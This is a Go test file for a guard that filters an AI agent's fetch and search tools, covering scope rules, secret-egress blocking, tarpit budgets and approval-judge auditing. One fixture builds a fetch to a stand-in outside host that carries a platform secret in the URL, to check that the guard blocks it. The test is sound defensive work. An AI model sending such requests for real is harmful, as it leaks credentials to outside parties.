package guard

import (
	"context"
	"database/sql"
	"encoding/json"
	"strings"
	"testing"

	"github.com/Autumn-27/artex/db"
	"github.com/Autumn-27/artex/intercept"
	_ "modernc.org/sqlite"
)

func TestRoEDeepSeekFetchMatchesWebFetch(t *testing.T) {
	for _, mode := range []string{"strict", "warn"} {
		g := roeGuard(mode, []ScopeRule{{Kind: "domain", Value: "allowed.test"}})
		input, _ := json.Marshal(map[string]string{"url": "https://outside.test/fixture"})
		blocked, _, _ := g.Hooks().PreToolUse(context.Background(), "deepseek_fetch", input)
		if blocked != (mode == "strict") {
			t.Fatalf("deepseek_fetch mode=%s blocked=%v", mode, blocked)
		}
		input, _ = json.Marshal(map[string]string{"url": "https://allowed.test/fixture"})
		if blocked, _, _ := g.Hooks().PreToolUse(context.Background(), "deepseek_fetch", input); blocked {
			t.Fatal("in-scope outsourced fetch blocked")
		}
	}
}

func TestDeepSeekToolsCannotSendPlatformSecrets(t *testing.T) {
	const secret = "fixture-platform-private-secret"
	for _, tc := range []struct{ name, input string }{
		{"deepseek_search", `{"query":"search for ` + secret + `"}`},
		{"deepseek_fetch", `{"url":"https://outside.test/collect?key=` + secret + `"}`},
	} {
		g := roeGuard("strict", []ScopeRule{{Kind: "domain", Value: "allowed.test"}})
		e := NewEgressGuard()
		e.AddFingerprint("llm_api_key", secret)
		g.SetEgress(e)
		blocked, msg, _ := g.Hooks().PreToolUse(t.Context(), tc.name, []byte(tc.input))
		if !blocked || !strings.Contains(msg, "操作包含平台敏感信息") || strings.Contains(msg, secret) {
			t.Fatalf("%s leaked secret or reached scope/approval before egress: %v %s", tc.name, blocked, msg)
		}
		for _, record := range g.Audit() {
			if strings.Contains(record.Command, secret) || strings.Contains(record.Reason, secret) {
				t.Fatal("blocked secret entered guard audit")
			}
		}
	}
}

func TestDeepSeekFetchSharesTarpitBudget(t *testing.T) {
	g := New()
	hints := 0
	g.SetTarpit(TarpitConfig{Budget: func() int { return 1 }, Hint: func(host string, count int) {
		hints++
		if host != "maze.test" || count != 2 {
			t.Fatalf("wrong shared budget: host=%s count=%d", host, count)
		}
	}})
	for _, tool := range []string{"WebFetch", "deepseek_fetch", "WebFetch", "deepseek_fetch"} {
		blocked, _, _ := g.Hooks().PreToolUse(t.Context(), tool, []byte(`{"url":"https://maze.test/fixture"}`))
		if blocked {
			t.Fatal("tarpit warning became a block")
		}
	}
	if hints != 1 {
		t.Fatalf("mixed fetches bypassed tarpit or duplicated hints: %d", hints)
	}
}

func TestDeepSeekToolsReachExistingApprovalJudgeWithoutRenamingAudit(t *testing.T) {
	for _, enabled := range []bool{false, true} {
		for _, name := range []string{"deepseek_fetch", "deepseek_search"} {
			d, err := sql.Open("sqlite", ":memory:")
			if err != nil {
				t.Fatal(err)
			}
			t.Cleanup(func() { _ = d.Close() })
			if _, err := d.Exec(`CREATE TABLE settings (key TEXT PRIMARY KEY, value TEXT);
CREATE TABLE intercept_rules (
 id INTEGER, name TEXT, enabled BOOLEAN, priority INTEGER, match_target TEXT, match_type TEXT,
 pattern TEXT, action TEXT, message TEXT, timeout_enabled BOOLEAN, timeout_seconds INTEGER,
 timeout_action TEXT, builtin BOOLEAN, created_at TIMESTAMP, updated_at TIMESTAMP);`); err != nil {
				t.Fatal(err)
			}
			pg := &db.DB{DB: d}
			enabledJSON := `[]`
			if enabled {
				enabledJSON = `["WebFetch","web_search"]`
			}
			for key, value := range map[string]string{"llm_judge_enabled": "true", "llm_judge_retry_count": "0", "intercept_enabled_tools": enabledJSON} {
				if _, err := d.Exec(`INSERT INTO settings(key,value) VALUES (?,?)`, key, value); err != nil {
					t.Fatal(err)
				}
			}
			ic := intercept.New(pg)
			calls := 0
			ic.SetReviewer(func(_ context.Context, _ int64, _ string, input intercept.ReviewInput) (intercept.Decision, error) {
				calls++
				if input.Tool != name {
					t.Fatal("reviewer input lost actual backend name")
				}
				return intercept.Decision{Action: "deny", Message: "fixture denied by judge"}, nil
			})
			g := NewWithInterceptor(ic)
			input := []byte(`{"url":"https://fixture.invalid","query":"fixture"}`)
			blocked, _, _ := g.Hooks().PreToolUse(t.Context(), name, input)
			if blocked != enabled || calls != btoiFixture(enabled) {
				t.Fatalf("%s enabled=%v blocked=%v reviewer_calls=%d", name, enabled, blocked, calls)
			}
			for _, record := range g.Audit() {
				if record.Tool != name {
					t.Fatal("audit backend name was replaced with policy alias")
				}
			}
		}
	}
}

func btoiFixture(value bool) int {
	if value {
		return 1
	}
	return 0
}
